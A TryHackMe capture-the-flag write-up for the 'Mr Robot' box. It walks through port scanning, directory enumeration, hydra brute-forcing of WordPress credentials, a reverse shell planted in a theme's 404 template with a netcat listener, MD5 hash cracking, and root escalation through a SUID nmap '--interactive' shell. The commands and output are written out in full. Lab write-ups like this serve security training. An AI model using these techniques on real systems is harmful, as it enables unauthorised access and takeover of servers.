---
title: "TryHackMe - Mr Robot CTF"
categories:
  - TryHackMe
tags:
  - linux
  - writeup
  - tryhackme
  - hacking
  - boot2root
---
Based on the Mr. Robot show, can you root this box?

## Scanning
Let's scan all ports with `aggressive` mode from `nmap`.
```bash
$ rustscan -a 10.10.221.72 -- -A                           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.221.72:80
Open 10.10.221.72:443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 09:35 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
Initiating Ping Scan at 09:35
Scanning 10.10.221.72 [2 ports]
Completed Ping Scan at 09:35, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:35
Completed Parallel DNS resolution of 1 host. at 09:35, 13.03s elapsed
DNS resolution of 1 IPs took 13.03s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 09:35
Scanning 10.10.221.72 [2 ports]
Discovered open port 443/tcp on 10.10.221.72
Discovered open port 80/tcp on 10.10.221.72
Completed Connect Scan at 09:35, 0.21s elapsed (2 total ports)
Initiating Service scan at 09:35
Scanning 2 services on 10.10.221.72
Completed Service scan at 09:36, 14.91s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.221.72.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 11.13s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 2.60s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
Nmap scan report for 10.10.221.72
Host is up, received syn-ack (0.21s latency).
Scanned at 2021-01-13 09:35:43 EST for 42s

PORT    STATE SERVICE  REASON  VERSION
80/tcp  open  http     syn-ack Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
```
2 ports open, HTTP and HTTPS.

## Enumerate
Port 80:

<a href="/assets/images/tryhackme/mr-robot-ctf/1.png"><img src="/assets/images/tryhackme/mr-robot-ctf/1.png"></a>

There is `robots.txt` file, let's look at it.

<a href="/assets/images/tryhackme/mr-robot-ctf/2.png"><img src="/assets/images/tryhackme/mr-robot-ctf/2.png"></a>

We found our first key at [http://10.10.221.72/key-1-of-3.txt](http://10.10.221.72/key-1-of-3.txt). We also found a dictionary, it might be useful later on.

Enumerating the directory:
```bash
$ gobuster dir -u http://10.10.221.72/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,jpg,html,css,jpeg,txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.221.72/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg,html,css,jpeg,txt,php
[+] Timeout:        10s
===============================================================
2021/01/13 09:42:44 Starting gobuster
===============================================================
/index.php (Status: 301)
/index.html (Status: 200)
/images (Status: 301)
/blog (Status: 301)
/rss (Status: 301)
/sitemap (Status: 200)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/wp-login.php (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
```

It's a wordpress! Let's go to `wp-login`.

<a href="/assets/images/tryhackme/mr-robot-ctf/3.png"><img src="/assets/images/tryhackme/mr-robot-ctf/3.png"></a>

Since we dont have any username, let's bruteforce the username.
```bash
$ hydra -L fsocity.dic -p aaaaa 10.10.221.72 -t 25 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-13 10:00:25
[DATA] max 25 tasks per 1 server, overall 25 tasks, 858235 login tries (l:858235/p:1), ~34330 tries per task
[DATA] attacking http-post-form://10.10.221.72:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.221.72   login: Elliot   password: aaaaa
```

Let's sort the wordlists first, because it's to large any many duplicates.
```bash
$ sort fsocity.dic | uniq > sorted_fsociety.dic
$ wc sorted_fsociety.dic                                                                    
11451 11451 96747 sorted_fsociety.dic
$ wc fsocity.dic        
858160  858160 7245381 fsocity.dic
```

We found the username, `Elliot`. Let's bruteforce the password now.
```bash
$ hydra -l Elliot -P Downloads/sorted_fsociety.dic 10.10.250.224 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -t 35
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-13 22:21:14
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 35 tasks per 1 server, overall 35 tasks, 11452 login tries (l:1/p:11452), ~328 tries per task
[DATA] attacking http-post-form://10.10.250.224:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location
[STATUS] 208.00 tries/min, 208 tries in 00:01h, 11244 to do in 00:55h, 35 active
[STATUS] 189.00 tries/min, 567 tries in 00:03h, 10885 to do in 00:58h, 35 active
[STATUS] 228.57 tries/min, 1600 tries in 00:07h, 9852 to do in 00:44h, 35 active
^[[STATUS] 203.33 tries/min, 3050 tries in 00:15h, 8402 to do in 00:42h, 35 active
[80][http-post-form] host: 10.10.250.224   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-13 22:49:20
```

We got the password, let's login.

<a href="/assets/images/tryhackme/mr-robot-ctf/4.png"><img src="/assets/images/tryhackme/mr-robot-ctf/4.png"></a>

## Exploit

Let's upload our reverse shell at the `404 template`!

<a href="/assets/images/tryhackme/mr-robot-ctf/5.png"><img src="/assets/images/tryhackme/mr-robot-ctf/5.png"></a>

Set up our `netcat` listener.
```bash
$ nc -lnvp 9999
listening on [any] 9999 ...
```

Go to random page that triggers `404` page and we got our shell back.
```bash
$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.11.25.205] from (UNKNOWN) [10.10.250.224] 50305
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 03:55:09 up  1:17,  0 users,  load average: 0.02, 1.80, 3.78
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
```

## Escalation
Looking for interesting files. Got `robot` user password with md5.
```bash
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Let's dehash it.

<a href="/assets/images/tryhackme/mr-robot-ctf/6.png"><img src="/assets/images/tryhackme/mr-robot-ctf/6.png"></a>

Let's change user to `robot`.
```bash
daemon@linux:/home/robot$ su robot
su robot
Password: 
robot@linux:~$ whoami
whoami
robot
```

key 2:
```bash
robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
REDACTED
```

I downloaded `linpeas` and i run it and i found interesting SUID.
```bash
[+] SUID - Check easy privesc, exploits and write perms                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                 
strace Not Found                                                                                              
-rwsr-xr-x 1 root root  46K Feb 17  2014 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                     
-rwsr-xr-x 1 root root  67K Feb 17  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root  41K Feb 17  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root  46K Feb 17  2014 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root  32K Feb 17  2014 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root  37K Feb 17  2014 /bin/su
-rwsr-xr-x 1 root root  10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root  44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root  44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 431K May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root  68K Feb 12  2015 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root  93K Feb 12  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                    
-rwsr-xr-x 1 root root  11K Feb 25  2015 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
-rwsr-xr-x 1 root root 152K Mar 12  2015 /usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
-r-sr-xr-x 1 root root 9.4K Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root  14K Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

Yep, `nmap`. Let's abuse it. Source: [here](https://pentestlab.blog/2017/09/25/suid-executables/).
```bash
robot@linux:/tmp$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
```

key 3:
```bash
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
REDACTED
```